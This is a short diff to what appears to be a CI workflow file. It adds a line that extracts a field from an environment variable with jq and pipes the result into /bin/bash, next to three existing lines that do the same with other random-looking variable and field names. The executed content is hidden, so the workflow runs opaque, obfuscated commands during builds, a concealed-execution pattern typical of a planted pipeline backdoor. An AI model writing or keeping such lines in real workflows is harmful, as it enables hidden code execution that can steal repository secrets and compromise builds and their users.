@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$bc2" | jq -r .yqpm6 | /bin/bash
           echo $s5 | jq -r .e2 | /bin/bash
           echo $y20301 | jq -r .vidn0139 | /bin/bash
+          echo $sltxp6482 | jq -r .tu3436 | /bin/bash
 
       - name: Upload results
         if: always()
